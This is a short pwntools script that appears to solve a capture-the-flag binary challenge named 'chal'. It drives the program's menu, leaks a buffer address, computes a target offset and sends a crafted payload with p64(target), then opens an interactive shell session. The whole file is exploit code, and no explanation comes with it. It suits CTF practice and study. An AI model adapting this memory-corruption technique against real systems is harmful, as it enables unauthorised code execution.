from pwn import *

p = process('./chal')
#p = remote(ADDRESS, PORT)
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'0')
p.sendlineafter(b'>> ', b'2')
p.recvuntil(b'your buffer: ')
leaked_addr = int(p.recvline().strip(), 16)
p.sendlineafter(b'>> ', b'0')

p.sendlineafter(b'>> ', str(0x22222).encode())
target = leaked_addr + 1024 + 0x40 +  0x10 + 0x8
p.sendlineafter(b'buffer:', str(target).encode())
p.sendlineafter(b'size:', str(0x100).encode())
p.sendlineafter(b'>>', b'2')
p.sendlineafter(b'>>', b'0')

p.sendlineafter(b'>> ', b'1') 
payload = (b'2'*5 + b'\x00'*3) * 2
payload += p64(target)
p.sendafter(b'now can you beat BoxeR? [y/N]', payload)

p.interactive()